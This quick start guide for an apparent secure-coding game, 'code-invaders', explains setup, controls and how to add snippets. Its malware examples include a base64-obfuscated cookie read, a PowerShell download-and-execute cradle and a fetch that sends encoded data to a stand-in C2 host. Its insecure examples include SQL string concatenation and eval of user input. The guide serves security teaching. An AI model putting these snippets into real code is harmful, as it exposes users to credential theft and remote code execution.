# Quick Start Guide 🎮

## 1. Install & Build (First Time Only)

```bash
cd code-invaders
npm install
npm run build
```

## 2. Run the Game

```bash
npm run serve
```

This will automatically open the game in your browser at `http://localhost:8000`

## Alternative: Manual Steps

```bash
# Compile TypeScript
npx tsc

# Serve with Python
python3 -m http.server 8000

# OR serve with Node
npx http-server -p 8000

# Then open: http://localhost:8000
```

## 3. Play!

- **Move**: Arrow keys or A/D
- **Shoot**: Spacebar
- **Pause**: P
- **Restart**: R (when game over)

### Quick Tips

1. **Green blocks = Good** → Don't shoot them!
2. **Orange/Yellow = Vulnerable** → Destroy for +10 points
3. **Red/Purple = Malware** → Destroy for +25 points
4. **Build streaks** (3+ correct hits) → Get 1.5x multiplier
5. **Don't let bad code reach the bottom** → Big penalties!

## Code Examples You'll See

### ✅ Secure (Don't shoot!)
- `stmt = conn.prepare("SELECT * FROM users WHERE id=?")`
- `bcrypt.hash(password, 12)`
- `const safe = DOMPurify.sanitize(userInput)`

### ⚠️ Insecure (Shoot it!)
- `query = "SELECT * FROM users WHERE id=" + userId`
- `eval(userInput)`
- `password = ""`

### ☠️ Malware (Definitely shoot!)
- `eval(atob("dmFyIGE9ZG9jdW1lbnQuY29va2ll"))`
- `IEX(New-Object Net.WebClient).DownloadString(...)`
- `fetch("http://c2-server.evil/beacon?data=" + btoa(...))`

---

## 📝 Adding Your Own Code Snippets

**Super Easy!** Just edit `snippets.json`:

```json
{
  "secure": [
    "Add your secure code example here",
    "Another secure pattern..."
  ],
  "insecure": [
    "Add your vulnerability example here",
    "Another insecure pattern..."
  ],
  "malware": [
    "Add your malware pattern here",
    "Another suspicious code..."
  ]
}
```

**No compilation needed!** Just refresh your browser to see the new snippets in the game.

The code blocks are now **much larger** with bigger text (14px font) so they're easy to read while playing!

---

**That's it! Have fun learning secure coding! 🚀🔐**
